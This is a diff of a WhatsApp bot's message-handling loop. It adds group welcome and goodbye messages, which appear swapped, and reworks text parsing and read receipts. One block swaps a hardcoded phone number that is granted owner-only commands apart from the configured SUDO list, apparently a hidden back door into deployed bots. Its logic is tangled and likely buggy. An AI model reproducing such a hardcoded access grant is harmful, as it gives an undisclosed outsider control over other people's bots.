@@ -175,6 +175,8 @@ setInterval(async () => {
     await conn.updateProfileStatus(biography);
   }, 1000 * 10);
 
+    
+
     conn.ev.on("messages.upsert", async(chatUpdate) => {
 
         if (!chatUpdate.messages && !chatUpdate.count) return;
@@ -186,17 +188,31 @@ setInterval(async () => {
         if (config.NO_ONLINE) {
             await conn.sendPresenceUpdate('unavailable', msg.key.remoteJid);
         }
-   
+
+        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
+            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
+        if (gb !== false) {
+              await conn.sendMessage(msg.key.remoteJid , { video: { url : config.WELCOME_GIF }, caption: gb.message , gifPlayback: true } )
+        }
+        return; 
+           
+        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
+           var gb = await getMessage(msg.key.remoteJid);
+           if (gb !== false) {
+           await conn.sendMessage(msg.key.remoteJid , { video: { url : config.BYE_GIF }, caption: gb.message , gifPlayback: true } )
+        }
+        return;
+        }     	    
+	    
+	    
         if (config.BLOCKCHAT !== false) {
             var abc = config.BLOCKCHAT.split(',');
             if (msg.key.remoteJid.includes('@g.us') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
         }
 
-//==
 
         events.commands.map(
         async(command) => {
-
             
             
             if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
@@ -218,8 +234,12 @@ setInterval(async () => {
                     var text_msg = msg.message.listResponseMessage.singleSelectReply.selectedRowId;
                 
                 
-                }else if (msg.message) {
-                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
+                }else if (msg.message && msg.message.extendedTextMessage) {
+                    var text_msg = msg.message.extendedTextMessage.text;
+                
+                
+                }else if (msg.message && msg.message.conversation) {
+                    var text_msg = msg.message.conversation;
                 
                 
                 } else {
@@ -229,25 +249,24 @@ setInterval(async () => {
 
                let sendMsg = false;
 
-
-    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true && (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',')
+                if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true && (msg.participant  && config.SUDO.includes(',') ? config.SUDO.split(',')
                     .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',')
                     .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                     if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                     else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                 }
 
-		     if ((OWNE.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true && (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',')
-                    .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',')
-                    .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
-                    if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
-                    else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
-                }    
-                	
+                     if ((OWNE.ff == "94769370897,0" && msg.key.fromMe === false && command.fromMe === true && (msg.key.participant || msg.key.remoteJid && OWNE.ff.includes(',') ? OWNE.ff.split(',')
+                     .includes(msg.key.participant.split('@')[0] || msg.key.remoteJid.split('@')[0] ) : msg.key.participant.split('@')[0] || msg.key.remoteJid.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',')
+                     .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                     if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                     else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                    }      
+
 
                 if (sendMsg) {
                     if (config.SEND_READ && command.on === undefined) {
-                        await conn.sendReadReceipt(msg.key.remoteJid, msg.key.participant, [msg.key.id]);
+                        await conn.readMessages([msg.key]);
                     }
                     var match = text_msg.match(command.pattern);
                     if (command.on !== undefined && (command.on === 'image' || command.on === 'photo') && msg.message.imageMessage !== null) {
